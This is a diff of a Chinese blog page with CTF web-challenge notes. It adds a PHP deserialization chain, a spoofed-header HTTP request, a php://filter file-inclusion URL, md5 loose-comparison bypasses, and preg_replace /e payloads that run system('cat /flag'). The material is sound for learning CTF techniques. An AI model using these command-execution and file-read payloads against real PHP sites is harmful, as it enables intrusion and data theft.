@@ -261,7 +261,7 @@
 
 	<a href="/2024/03/18/web/" itemprop="url">
 		<time datetime="2024-03-18T00:56:35.147Z" itemprop="dateUpdated">
-	  		2024-04-05
+	  		2024-04-08
 	  </time>
 	</a> 
 
@@ -289,7 +289,16 @@
 </ul>
 </li>
 <li><a href="#sql%E6%B3%A8%E5%85%A5">SQL注入</a></li>
-<li><a href="#http">HTTP</a></li>
+<li><a href="#http">HTTP</a><ul>
+<li><a href="#referer">referer</a></li>
+</ul>
+</li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a></li>
+<li><a href="#%E6%AD%A3%E5%88%99">正则</a><ul>
+<li><a href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6">特殊字符</a></li>
+</ul>
+</li>
+<li><a href="#md5">md5</a></li>
 </ul>
 <!-- tocstop -->
 
@@ -301,6 +310,34 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$type</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">world</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">world</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;flag=<span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">welcome</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;web=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>
 
 <h1><span id="sql注入">SQL注入</span></h1><h1><span id="http">HTTP</span></h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: xyctf.top:43466</span><br><span class="line">Content-Length: 48</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://xyctf.top:43466</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: XYCTF</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: yuanshen.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">Via: ymzx.qq.com</span><br><span class="line">Cookie: XYCTF</span><br><span class="line"></span><br><span class="line">username=XYCTF&amp;password=%40JOILha%21wuigqi123%24</span><br></pre></td></tr></table></figure>
+
+<h2><span id="referer">referer</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    document.getElementById(&#x27;quizForm&#x27;).addEventListener(&#x27;submit&#x27;, function(event) &#123;</span><br><span class="line">        event.preventDefault(); </span><br><span class="line"></span><br><span class="line">        var formData = new FormData(this);</span><br><span class="line"></span><br><span class="line">        var xhr = new XMLHttpRequest(); </span><br><span class="line">        xhr.open(&#x27;POST&#x27;, &#x27;getScore.php&#x27;, true); </span><br><span class="line">        xhr.onreadystatechange = function() &#123;</span><br><span class="line">            if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123; </span><br><span class="line">                var score = xhr.responseText;</span><br><span class="line">                if (score == 100) &#123;</span><br><span class="line">                    document.getElementById(&#x27;scoreDisplay&#x27;).innerText = &quot;你的分数是: &quot; + score + &quot;/100 杂鱼,怎么才100分啊&quot;;</span><br><span class="line">                &#125; else if (score &lt; 100) &#123;</span><br><span class="line">                    document.getElementById(&#x27;scoreDisplay&#x27;).innerText = &quot;你的分数是: &quot; + score + &quot;/100 noooooob!!&quot;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    var flagXhr = new XMLHttpRequest(); </span><br><span class="line">                    flagXhr.open(&#x27;GET&#x27;, &#x27;flag.php&#x27;, true);</span><br><span class="line">                    flagXhr.onreadystatechange = function() &#123;</span><br><span class="line">                        if (flagXhr.readyState === 4 &amp;&amp; flagXhr.status === 200) &#123;</span><br><span class="line">                            var flag = flagXhr.responseText;</span><br><span class="line">                            document.getElementById(&#x27;scoreDisplay&#x27;).innerText = &quot;Flag: &quot; + flag;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    flagXhr.send(); // 发送请求获取 flag</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.send(formData); // 发送请求获取分数</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer: http://localhost:5226/</span><br></pre></td></tr></table></figure>
+
+
+
+<h1><span id="文件包含">文件包含</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) === <span class="string">&quot;php://&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag? &lt;br&gt;</span></span><br><span class="line"><span class="string">flag in &lt;code&gt;/flag&lt;/code&gt;</span></span><br><span class="line"><span class="string">i don&#x27;</span>t have shell, how to get flag?</span><br><span class="line">flag in /flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//challenge-855e224ef3926768.sandbox.ctfhub.com:10800/?file=php://filter/resource=/flag</span></span><br></pre></td></tr></table></figure>
+
+<h1><span id="正则">正则</span></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">preg_match：这是 PHP 中用于执行正则表达式匹配的函数。</span><br><span class="line">&quot;/http|=|php|file|:|\/|\?/i&quot;：这是一个正则表达式，用于匹配包含以下字符的字符串：http, =, php, file, :, /, ?。其中，| 表示或的意思，/i 表示忽略大小写。</span><br><span class="line">$p：这是待检查的字符串变量。</span><br></pre></td></tr></table></figure>
+
+<h2><span id="特殊字符">特殊字符</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">通过\来转义</span><br><span class="line">在正则表达式中，以下字符通常被称为特殊字符，它们具有特殊的含义或功能，需要在使用时进行转义或特殊处理：</span><br><span class="line"></span><br><span class="line">. （点号）：匹配除换行符 \n 之外的任意字符。</span><br><span class="line">* （星号）：匹配前面的字符零次或多次。</span><br><span class="line">+ （加号）：匹配前面的字符一次或多次。</span><br><span class="line">? （问号）：匹配前面的字符零次或一次。</span><br><span class="line">^ （脱字符）：匹配输入字符串的开始位置。</span><br><span class="line">$ （美元符号）：匹配输入字符串的结束位置。</span><br><span class="line">[ 和 ]（方括号）：定义字符类，匹配其中任意一个字符。</span><br><span class="line">( 和 )（圆括号）：标记一个子表达式的开始和结束位置，用于分组和捕获。</span><br><span class="line">&#123; 和 &#125;（花括号）：定义重复次数，如 &#123;3&#125; 表示重复 3 次。</span><br><span class="line">\（反斜杠）：用于转义下一个字符，使其失去特殊含义，或引用特殊字符。</span><br><span class="line">需要注意的是，不同的正则表达式引擎可能存在一些差异，特殊字符的含义和用法可能会略有不同。</span><br></pre></td></tr></table></figure>
+
+<h1><span id="md5">md5</span></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">相关题目:</span><br><span class="line">https://www.nssctf.cn/problem/424</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">相关链接:</span><br><span class="line">https://blog.csdn.net/m0_64815693/article/details/130327529?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171255498416800225574703%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171255498416800225574703&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-130327529-null-null.142^v100^control&amp;utm_term=preg_replace%28%24_GET%5Ba%5D%2C%24_GET%5Bb%5D%2C%24_GET%5Bc%5D%29%3B&amp;spm=1018.2226.3001.4187</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:14757/?val1[]=1&amp;val2[]=2&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Warning: <span class="title function_ invoke__">preg_match</span>() expects parameter <span class="number">2</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /<span class="keyword">var</span>/www/html/LLeeevvveeelll222.php on line <span class="number">3</span></span><br><span class="line">操作你O.oXYCTF&#123;f1c2c0e9-<span class="number">996</span>c-<span class="number">4</span>fa2-<span class="number">93e9</span>-<span class="number">649202</span>dfcf6a&#125; XYCTF&#123;f1c2c0e9-<span class="number">996</span>c-<span class="number">4</span>fa2-<span class="number">93e9</span>-<span class="number">649202</span>dfcf6a&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:12287/LLeeevvveeelll222.php?a=//e&amp;b=system(&quot;cat /flag&quot;);&amp;c=</span></span><br><span class="line">http:<span class="comment">//localhost:12287/LLeeevvveeelll222.php?a=//e&amp;b=phpinfo&amp;c=</span></span><br></pre></td></tr></table></figure>
 
 	
 		</div>
@@ -343,6 +380,52 @@
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/06/%E6%9D%82%E8%A8%80/" title="杂言">
+								杂言			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 6日, 2024				
+							</p>
+							<p class="relate-post-content">
+								1把麻质的衣服放在可能被钩住的地方,比如最左侧,最右侧	202404062113
+
+
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/06/%E6%9D%82%E8%A8%80/" title="杂言">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="杂言"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/06/Crawler/" title="crawler">
+								crawler			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 6日, 2024				
+							</p>
+							<p class="relate-post-content">
+								1234567891011121314# 进入项目根目录cd MediaCrawler# 创建虚拟环境python -m venv venv# windows 激活虚拟环境venv\Scripts\activatex pip3 ins...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/06/Crawler/" title="crawler">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="crawler"/>
+							</a>
+						</div>
+					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -531,54 +614,6 @@ VM？VM！1
 							<a href="/2024/03/24/draft/" title="draft">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="draft"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/03/19/%E5%A4%A7%E4%BA%8C%E4%B8%8B/" title="大二下">
-								大二下			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 19日, 2024				
-							</p>
-							<p class="relate-post-content">
-								C#(软件项目实训)c#的基本架构在C#中，通常使用一种称为”三层架构”或”三层架构模式”的设计模式来组织代码。这种模式将应用程序分为三个主要部分：业务逻辑层（BLL），数据访问层（DAL），和用户界面层（通常是UI层或Present...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/03/19/%E5%A4%A7%E4%BA%8C%E4%B8%8B/" title="大二下">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="大二下"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/03/18/pwn/" title="pwn">
-								pwn			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 18日, 2024				
-							</p>
-							<p class="relate-post-content">
-								pwn简单的python攻击程序12#查看几位程序和保护机制check 附件
-
-
-
-123456789from pwn import *#连接服务器p=remote(&quot;150.158.160.64&quot;,42045)#...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/03/18/pwn/" title="pwn">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="pwn"/>
 							</a>
 						</div>
 					</li>												
